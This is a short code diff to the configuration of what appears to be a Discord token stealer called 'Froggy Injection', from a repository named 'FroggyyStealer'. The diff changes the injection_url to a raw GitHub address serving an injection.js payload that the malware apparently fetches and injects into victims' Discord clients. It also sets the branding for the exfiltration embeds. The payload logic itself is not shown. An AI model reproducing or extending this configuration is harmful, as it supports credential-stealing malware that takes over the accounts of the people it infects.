@@ -14,7 +14,7 @@ const config = {
   embed_name: 'Froggy Injection', 
   embed_icon: 'https://cdn.discordapp.com/attachments/1174377567449526353/1183333335079067689/froggy.png?ex=6587f40c&is=65757f0c&hm=de46398b6efade55050cb2d40b0146c8b6a37c53d2d45afb897a8a8a44d9cf0a&'.replace(/ /g, '%20'), 
   embed_color: 2895667, 
-  injection_url: https://raw.githubusercontent.com/FroggyyStealer/sdssd/injection.js', 
+  injection_url: 'https://raw.githubusercontent.com/FroggyyStealer/denenle/main/injection.js', 
   /**
    
    **/
